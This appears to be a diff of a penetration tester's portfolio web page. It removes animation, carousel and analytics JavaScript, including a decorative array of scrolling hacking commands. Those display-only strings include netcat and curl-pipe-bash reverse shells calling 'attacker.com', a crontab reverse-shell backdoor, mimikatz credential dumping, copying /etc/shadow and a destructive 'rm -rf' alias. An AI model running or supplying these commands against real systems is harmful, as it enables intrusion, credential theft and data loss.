-    'sublist3r -d target.com',
-    'dnsenum target.com',
-    'fierce --domain target.com',
-    'amass enum -d target.com',
-
-    // Exploitation
-    'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"',
-    'exploit-db search buffer overflow windows',
-    'python3 shellshock.py --target target.com',
-    'searchsploit vsftpd 2.3.4',
-    'python3 exploit.py 192.168.0.105 80',
-    'nc -e /bin/bash attacker.com 4444',
-    'curl -s http://attacker.com/shell.sh | bash',
-
-    // Post-exploitation
-    'mimikatz "privilege::debug" "sekurlsa::logonpasswords"',
-    'meterpreter > getuid',
-    'scp root@target:/etc/shadow ./shadow_backup',
-    'sshpass -p "toor" ssh root@target',
-    'powershell -enc <base64 payload>',
-    'crackmapexec smb target -u admin -p password',
-
-    // Privilege Escalation
-    'sudo -l',
-    'find / -perm -u=s -type f 2>/dev/null',
-    'getcap -r / 2>/dev/null',
-    'linpeas.sh | tee linpeas-output.txt',
-    'pspy64',
-    'python -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
-
-    // Persistence
-    'echo "@reboot root /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" >> /etc/crontab',
-    'ssh-keygen -t rsa && cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys',
-    'echo "alias ls=\'rm -rf *\'" >> ~/.bashrc',
-    'cp backdoor /usr/local/bin/cronjobd && echo "/usr/local/bin/cronjobd" >> /etc/rc.local',
-
-    // Web Application Tools
-    'sqlmap -u "http://target.com/login.php?id=1" --dump',
-    'nikto -host https://target.com',
-    'gobuster dir -u http://target.com -w big.txt',
-    'wfuzz -c -z file,users.txt -z file,pass.txt --hc 401 http://target.com/login.php',
-    'wpscan --url http://wordpress.target --enumerate u',
-
-    // Cracking / Crypto
-    'hashcat -m 1800 -a 0 hashes.txt rockyou.txt',
-    'john --format=md5crypt --wordlist=rockyou.txt hash.txt',
-    'gpg --import stolen_private_key.gpg',
-    'openssl enc -aes-256-cbc -d -in secrets.enc -out secrets.txt',
-    'python3 bruteforce.py --zipfile secret.zip --wordlist rockyou.txt',
-
-    // Networking & Monitoring
-    'tcpdump -i wlan0 port 80',
-    'wireshark -k -i eth0',
-    'ettercap -T -q -i eth0 -M arp:remote /target/ /gateway/',
-    'netstat -tulnp',
-    'iptables -A INPUT -p tcp --dport 22 -j DROP',
-    'ip a; ip r; iptables -L',
-
-    // Linux Enumeration
-    'uname -a',
-    'lsblk',
-    'cat /etc/passwd',
-    'history | tail -n 100',
-    'env',
-    'ls -la /home/*/.ssh',
-
-    // Miscellaneous / Lateral Movement
-    'smbclient -L //target/share -N',
-    'rpcclient -U "" -N target',
-    'crackmapexec smb 192.168.1.0/24 -u admin -p admin',
-    'rdesktop -u user -p password target.com',
-    'xfreerdp /u:user /p:pass /v:192.168.1.10',
-
-    // Persistence Through Tools
-    'systemctl enable reverse-shell.service',
-    'echo "malicious_script.sh" > /etc/init.d/malicious && chmod +x /etc/init.d/malicious'
-];
-
-    function createCommand() {
-                const command = document.createElement('div');
-                command.className = 'command-line';
-                command.textContent = '$ ' + commands[Math.floor(Math.random() * commands.length)];
-                command.style.top = Math.random() * 100 + '%';
-                command.style.animationDuration = (Math.random() * 15 + 10) + 's';
-                command.style.fontSize = (Math.random() * 4 + 10) + 'px';
-                container.appendChild(command);
-
-        setTimeout(() => {
-            if (command.parentNode) {
-                command.parentNode.removeChild(command);
-            }
-        }, 30000);
-    }
-
-    // Create a denser stream of commands by decreasing interval and launching multiple per tick
-    setInterval(() => {
-        for (let i = 0; i < 1; i++) {  // Increase multiplier to raise density
-            createCommand();
-        }
-    }, 1000);
-}
-
-
-        // Auto-sliding Carousel Functions
-        function startCarouselAutoplay() {
-            setInterval(() => {
-                nextSlide();
-            }, 8000); // Auto-advance every 8 seconds
-        }
-
-        function nextSlide() {
-            currentSlide = (currentSlide + 1) % totalSlides;
-            updateCarousel();
-        }
-
-        function goToSlide(slideIndex) {
-            currentSlide = slideIndex;
-            updateCarousel();
-        }
-
-        function updateCarousel() {
-            const container = document.getElementById('carousel-container');
-            const dots = document.querySelectorAll('.carousel-dot');
-            
-            container.style.transform = `translateX(-${currentSlide * 100}%)`;
-            
-            // Update dots
-            dots.forEach((dot, index) => {
-                if (index === currentSlide) {
-                    dot.classList.add('active');
-                } else {
-                    dot.classList.remove('active');
-                }
-            });
-        }
-
-        // Enhanced tab navigation
-        function scrollToSection(sectionId) {
-            const section = document.getElementById(sectionId);
-            if (section) {
-                section.scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'start'
-                });
-                
-                // Update active tab
-                document.querySelectorAll('.nav-tab').forEach(tab => tab.classList.remove('active'));
-                event.target.closest('.nav-tab').classList.add('active');
-            }
-        }
-
-        // Scroll progress bar
-        function updateScrollProgress() {
-            window.addEventListener('scroll', () => {
-                const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
-                const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
-                const scrolled = (winScroll / height) * 100;
-                document.getElementById('scroll-progress').style.width = scrolled + '%';
-            });
-        }
-
-        // Resume modal functions
-        function openResumeModal() {
-            document.getElementById('resume-modal').style.display = 'flex';
-            document.body.style.overflow = 'hidden';
-        }
-
-        function closeResumeModal() {
-            document.getElementById('resume-modal').style.display = 'none';
-            document.body.style.overflow = 'auto';
-        }
-        function downloadResume() {
-            // Close the resume modal (presumably a pop-up or overlay window)
-            closeResumeModal();
-        
-            const link = document.createElement('a');
-            link.href = 'https://sorvox.com/personal/Ramis%20Pentester.pdf';
-            link.download = 'Ramis-Resume.pdf';
-            link.style.display = 'none';
-        
-            document.body.appendChild(link);
-        
-            link.click();
-        
-            // Remove the anchor from the DOM
-            document.body.removeChild(link);
-        }
-
-        // Enhanced smooth scrolling for all links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
-                    });
-                }
-            });
-        });
-
-        // Navbar background on scroll with theme consistency
-        window.addEventListener('scroll', function() {
-            const navbar = document.querySelector('.navbar');
-            const primaryColor = getComputedStyle(document.documentElement)
-                .getPropertyValue('--primary-color').trim();
-                
-            if (window.scrollY > 100) {
-                navbar.style.background = 'rgba(15, 23, 42, 0.98)';
-                navbar.style.borderBottom = `1px solid ${primaryColor}`;
-            } else {
-                navbar.style.background = 'rgba(15, 23, 42, 0.95)';
-                navbar.style.borderBottom = `1px solid ${primaryColor}`;
-            }
-        });
-  function enableAnalytics() {
-    // Google Analytics
-    const ga = document.createElement("script");
-    ga.src = "https://www.googletagmanager.com/gtag/js?id=G-GKD7JXRS66";
-    ga.async = true;
-    document.head.appendChild(ga);
-    ga.onload = () => {
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag("js", new Date());
-      gtag("config", "G-GKD7JXRS66");
-    };
-
-    // Microsoft Clarity
-    const clarity = document.createElement("script");
-    clarity.innerHTML = `(function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "rpwqh3rock");`;
-    document.head.appendChild(clarity);
-  }
-        // Enhanced analytics tracking
-        function trackUserInteraction(action, element) {
-            if (sessionStorage.getItem('gdpr-accepted')) {
-                console.log(`User interaction: ${action} on ${element}`);
-                enableAnalytics();
-            }
-        }
-
-        // Track important interactions for job application insights
-        document.addEventListener('click', function(e) {
-            if (e.target.matches('.resume-btn') || e.target.closest('.resume-btn')) {
-                trackUserInteraction('cv_download_attempt', 'hero_section');
-            }
-            if (e.target.matches('.nav-tab') || e.target.closest('.nav-tab')) {
-                const tooltip = e.target.getAttribute('data-tooltip') || e.target.closest('.nav-tab').getAttribute('data-tooltip');
-                trackUserInteraction('tab_navigation', tooltip);
-            }
-            if (e.target.matches('.theme-btn') || e.target.closest('.theme-btn')) {
-                const tooltip = e.target.getAttribute('data-tooltip') || e.target.closest('.theme-btn').getAttribute('data-tooltip');
-                trackUserInteraction('theme_change', tooltip);
-            }
-            if (e.target.matches('.skill-tag')) {
-                trackUserInteraction('skill_interest', e.target.textContent);
-            }
-            if (e.target.matches('.project-card') || e.target.closest('.project-card')) {
-                const projectTitle = e.target.querySelector('.project-title') || e.target.closest('.project-card').querySelector('.project-title');
-                if (projectTitle) {
-                    trackUserInteraction('project_interest', projectTitle.textContent);
-                }
-            }
-            if (e.target.matches('.social-link') || e.target.closest('.social-link')) {
-                const href = e.target.getAttribute('href') || e.target.closest('.social-link').getAttribute('href');
-                trackUserInteraction('social_link_click', href);
-            }
-        });
-
-        // Intersection Observer for tab highlighting
-        const sections = document.querySelectorAll('section[id]');
-        const navTabs = document.querySelectorAll('.nav-tab');
-
-        const observerOptions = {
-            threshold: 0.3,
-            rootMargin: '-100px 0px -100px 0px'
-        };
-
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    const sectionId = entry.target.id;
-                    navTabs.forEach(tab => tab.classList.remove('active'));
-                    
-                    const sectionOrder = ['home', 'about', 'skills', 'experience', 'projects', 'contact'];
-                    const activeIndex = sectionOrder.indexOf(sectionId);
-                    if (activeIndex !== -1 && navTabs[activeIndex]) {
-                        navTabs[activeIndex].classList.add('active');
-                    }
-                }
-            });
-        }, observerOptions);
-
-        sections.forEach(section => observer.observe(section));
-
-        // Handle carousel touch/swipe for mobile
-        let startX = 0;
-        let endX = 0;
-
-        document.getElementById('carousel-container').addEventListener('touchstart', (e) => {
-            startX = e.touches[0].clientX;
-        });
-
-        document.getElementById('carousel-container').addEventListener('touchend', (e) => {
-            endX = e.changedTouches[0].clientX;
-            handleSwipe();
-        });
-
-        function handleSwipe() {
-            const threshold = 50;
-            const diff = startX - endX;
-            
-            if (Math.abs(diff) > threshold) {
-                if (diff > 0) {
-                    // Swipe left - next slide
-                    nextSlide();
-                } else {
-                    // Swipe right - previous slide
-                    currentSlide = currentSlide === 0 ? totalSlides - 1 : currentSlide - 1;
-                    updateCarousel();
-                }
-            }
-        }
-
-        // Keyboard navigation
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'ArrowLeft') {
-                currentSlide = currentSlide === 0 ? totalSlides - 1 : currentSlide - 1;
-                updateCarousel();
-            } else if (e.key === 'ArrowRight') {
-                nextSlide();
-            }
-        });
-
-        // Performance optimization and error handling
-        function optimizePerformance() {
-            // Lazy load images when they come into view
-            const images = document.querySelectorAll('img[data-src]');
-            const imageObserver = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        const img = entry.target;
-                        img.src = img.dataset.src;
-                        img.classList.remove('lazy');
-                        imageObserver.unobserve(img);
-                    }
-                });
-            });
-            
-            images.forEach(img => imageObserver.observe(img));
-            
-            // Preload critical CSS
-            const criticalCSS = document.createElement('style');
-            criticalCSS.textContent = `
-                .fade-in-up { animation: fadeInUp 0.8s ease forwards; }
-                .loading { transition: opacity 0.5s ease; }
-            `;
-            document.head.appendChild(criticalCSS);
-        }
-
-        // Initialize performance optimizations
-        setTimeout(optimizePerformance, 3000);
-
-        // Error handling for production
-        window.addEventListener('error', (e) => {
-            console.error('Portfolio error:', e.error);
-        });
-
-        // Service Worker registration for PWA capabilities (if needed)
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => {
-                navigator.serviceWorker.register('/sw.js')
-                    .then(registration => {
-                        console.log('SW registered: ', registration);
-                    })
-                    .catch(registrationError => {
-                        console.log('SW registration failed: ', registrationError);
-                    });
-            });
-        }
-        // Mouse Trail Effect
-        function createMouseTrail() {
-            const trail = [];
-            const trailLength = 20;
-            
-            for (let i = 0; i < trailLength; i++) {
-                const dot = document.createElement('div');
-                dot.className = 'mouse-trail';
-                document.body.appendChild(dot);
-                trail.push(dot);
-            }
-            
-            document.addEventListener('mousemove', (e) => {
-                trail.forEach((dot, index) => {
-                    setTimeout(() => {
-                        dot.style.left = e.clientX + 'px';
-                        dot.style.top = e.clientY + 'px';
-                        dot.style.opacity = (trailLength - index) / trailLength;
-                        dot.style.transform = `scale(${(trailLength - index) / trailLength})`;
-                    }, index * 50);
-                });
-            });
-        }
-        // Final initialization log
-        setTimeout(() => {
-            console.log('🚀 Portfolio fully loaded and optimized!');
-            console.log('🎯 Features: OSCP-certified cybersecurity specialist portfolio');
-            console.log('📍 Location: Leeds, West Yorkshire, UK');
-            console.log('🎓 Education: Sheffield University MSc graduate');
-            console.log('🔒 Specializations: Penetration testing, vulnerability assessment, secure development');
-            console.log('📧 Contact: mramis1@outlook.com');
-        }, 4000);
-        // Matrix Rain Effect
-        function createMatrixRain() {
-            const matrixContainer = document.getElementById('matrix-rain');
-            const chars = '01010110110100101110011010101110100101110010101101101001011100110101011101001011100101011011010010111001101010111010010111001010110110100101110011010101110100101110010101101101001011100110101011101001011100101011011';
-            
-            function createChar() {
-                const char = document.createElement('div');
-                char.className = 'matrix-char';
-                char.textContent = chars[Math.floor(Math.random() * chars.length)];
-                char.style.left = Math.random() * 100 + '%';
-                char.style.animationDuration = (Math.random() * 3 + 2) + 's';
-                char.style.opacity = Math.random() * 0.5 + 0.2;
-                matrixContainer.appendChild(char);
-                
-                setTimeout(() => {
-                    if (char.parentNode) {
-                        char.parentNode.removeChild(char);
-                    }
-                }, 5000);
-            }
-            
-            setInterval(createChar, 200);
-        }
-        setTimeout(() => {
-            createMatrixRain();
-//            createCodeRain();
-//            createFloatingIcons();
-//            createFloatingCubes();
-            createMouseTrail();
-            setupAnalytics();
-        }, 2000);
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-GKD7JXRS66');
     </script>
 </body>
 </html>
